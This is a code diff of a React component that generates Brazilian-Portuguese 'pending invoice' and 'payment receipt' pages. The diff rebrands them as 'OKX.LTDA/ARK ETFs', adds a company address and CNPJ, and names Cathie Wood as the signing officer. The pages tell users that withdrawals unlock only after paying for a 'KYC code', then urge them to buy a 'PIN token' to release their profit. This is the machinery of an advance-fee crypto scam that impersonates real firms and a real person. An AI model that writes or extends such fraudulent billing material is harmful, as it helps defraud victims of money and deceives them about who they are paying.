@@ -27,6 +27,18 @@ const KycReceipts = () => {
   const pendingIframeRef = useRef(null);
   const successIframeRef = useRef(null);
 
+  // Company info
+  const companyInfo = {
+    name: 'OKX.LTDA/ARK ETFs',
+    cnpj: '45.123.789/0001-30',
+    address: 'Brigadeiro Faria Lima Avenue, 3477',
+    neighborhood: 'Itaim Bibi',
+    city: 'São Paulo - SP',
+    postalCode: '04538-133',
+    country: 'Brazil',
+    fullAddress: 'Brigadeiro Faria Lima Avenue, 3477, Itaim Bibi, São Paulo - SP, Postal Code: 04538-133, Brazil'
+  };
+
   // Generate invoice number on mount
   useEffect(() => {
     const generateInvoiceNumber = () => {
@@ -62,7 +74,7 @@ const KycReceipts = () => {
     <html lang="pt-BR">
     <head>
         <meta charset="UTF-8">
-        <title>Fatura Pendente - ARK Investment</title>
+        <title>Fatura Pendente - OKX.LTDA/ARK ETFs</title>
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
@@ -80,10 +92,10 @@ const KycReceipts = () => {
                 box-shadow: 0 8px 24px rgba(0,0,0,0.08);
             }
             .header { display: flex; justify-content: space-between; align-items: flex-end; border-bottom: 2px solid #eef2f7; padding-bottom: 24px; margin-bottom: 16px; flex-wrap: wrap; gap: 16px; }
-            .logo { font-size: 40px; font-weight: 800; color: #0a3cff; letter-spacing: -0.5px; }
+            .logo { font-size: 36px; font-weight: 800; color: #0a3cff; letter-spacing: -0.5px; }
             .logo span { color: #1bbf6b; }
-            .company-details { text-align: right; font-size: 14px; color: #4a5568; }
-            .company-details strong { font-size: 15px; color: #1a2c3e; display: block; }
+            .company-details { text-align: right; font-size: 14px; color: #4a5568; line-height: 1.6; }
+            .company-details strong { font-size: 15px; color: #1a2c3e; display: block; margin-bottom: 4px; }
             h1 { color: #0a3cff; font-size: 28px; margin: 24px 0 20px 0; font-weight: 600; }
             .meta { display: flex; justify-content: space-between; background: #f8fafc; padding: 16px 20px; border-radius: 12px; margin: 16px 0 24px 0; flex-wrap: wrap; gap: 12px; }
             .meta div { font-size: 14px; }
@@ -111,11 +123,11 @@ const KycReceipts = () => {
     <body>
     <div class="invoice">
         <div class="header">
-            <div class="logo">ARK<span>INVEST</span></div>
+            <div class="logo">OKX<span>ETF</span></div>
             <div class="company-details">
-                <strong>ARK Investment</strong>
-                Empresa de Investimentos em Criptomoedas<br>
-                CNPJ: 00.000.000/0001-00
+                <strong>${companyInfo.name}</strong>
+                ${companyInfo.fullAddress}<br>
+                CNPJ: ${companyInfo.cnpj}
             </div>
         </div>
         <h1>FATURA PENDENTE</h1>
@@ -149,7 +161,7 @@ const KycReceipts = () => {
             Seu saque e funcionalidades da conta serão ativados somente após a confirmação do pagamento.
         </div>
         <div class="footer">
-            © 2026 ARK Investment — Todos os direitos reservados.<br>
+            © ${new Date().getFullYear()} ${companyInfo.name} — Todos os direitos reservados.<br>
             Este documento é uma fatura comercial e não requer assinatura.
         </div>
     </div>
@@ -162,7 +174,7 @@ const KycReceipts = () => {
     <html lang="pt-BR">
     <head>
         <meta charset="UTF-8">
-        <title>Recibo de Pagamento - ARK Investment</title>
+        <title>Recibo de Pagamento - OKX.LTDA/ARK ETFs</title>
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
@@ -180,10 +192,10 @@ const KycReceipts = () => {
                 box-shadow: 0 8px 24px rgba(0,0,0,0.08);
             }
             .header { display: flex; justify-content: space-between; align-items: flex-end; border-bottom: 2px solid #eef2f7; padding-bottom: 24px; margin-bottom: 16px; flex-wrap: wrap; gap: 16px; }
-            .logo { font-size: 40px; font-weight: 800; color: #0a3cff; letter-spacing: -0.5px; }
+            .logo { font-size: 36px; font-weight: 800; color: #0a3cff; letter-spacing: -0.5px; }
             .logo span { color: #1bbf6b; }
-            .company-details { text-align: right; font-size: 14px; color: #4a5568; }
-            .company-details strong { font-size: 15px; color: #1a2c3e; display: block; }
+            .company-details { text-align: right; font-size: 14px; color: #4a5568; line-height: 1.6; }
+            .company-details strong { font-size: 15px; color: #1a2c3e; display: block; margin-bottom: 4px; }
             h1 { color: #1bbf6b; font-size: 28px; margin: 24px 0 20px 0; font-weight: 600; }
             .meta-row { display: flex; justify-content: space-between; background: #f8fafc; padding: 16px 20px; border-radius: 12px; margin: 16px 0 24px 0; flex-wrap: wrap; gap: 12px; }
             .meta-row div { font-size: 14px; }
@@ -215,11 +227,11 @@ const KycReceipts = () => {
     <body>
     <div class="receipt">
         <div class="header">
-            <div class="logo">ARK<span>INVEST</span></div>
+            <div class="logo">OKX<span>ETF</span></div>
             <div class="company-details">
-                <strong>ARK Investment</strong>
-                Empresa de Investimentos em Criptomoedas<br>
-                CNPJ: 00.000.000/0001-00
+                <strong>${companyInfo.name}</strong>
+                ${companyInfo.fullAddress}<br>
+                CNPJ: ${companyInfo.cnpj}
             </div>
         </div>
         <h1>✅ RECIBO DE PAGAMENTO</h1>
@@ -249,15 +261,15 @@ const KycReceipts = () => {
             <div class="status-success">✔️ Pagamento aprovado com sucesso</div>
         </div>
         <div class="declaration">
-            <strong>📄 Declaração Oficial:</strong> A <strong>ARK Investment</strong> declara que recebeu o valor acima descrito referente à 
-            <strong>Esta é sua confirmação oficial de pagamento. Sua conta está agora totalmente desbloqueada para saques e negociações. Compre o token pin para desbloquear todo o seu lucro.</strong>. Sua conta está totalmente desbloqueada para saques e operações.
+            <strong>📄 Declaração Oficial:</strong> A <strong>${companyInfo.name}</strong> (CNPJ: ${companyInfo.cnpj}) declara que recebeu o valor acima descrito referente à 
+            <strong>compra e ativação do Código KYC</strong>. Esta é sua confirmação oficial de pagamento. Sua conta está agora totalmente desbloqueada para saques e negociações. Compre o token PIN para desbloquear todo o seu lucro.
         </div>
         <div class="signature">
-            <div>Assinatura da Empresa<br><strong>ARK Investment</strong></div>
+            <div>Assinatura da Empresa<br><strong>${companyInfo.name}</strong></div>
             <div>Responsável Financeiro<br><strong>Cathie Wood</strong></div>
         </div>
         <div class="footer">
-            © 2026 ARK Investment — Todos os direitos reservados.<br>
+            © ${new Date().getFullYear()} ${companyInfo.name} — Todos os direitos reservados.<br>
             Comprovante emitido eletronicamente e válido em todo território nacional.
         </div>
     </div>
@@ -596,7 +608,7 @@ const KycReceipts = () => {
       {/* Security Footer */}
       <div className="mt-8 flex items-center justify-center gap-2 text-sm text-gray-500">
         <Shield size={16} />
-        Sistema seguro e verificado | ARK Investment
+        Sistema seguro e verificado | OKX.LTDA/ARK ETFs
       </div>
     </div>
   );
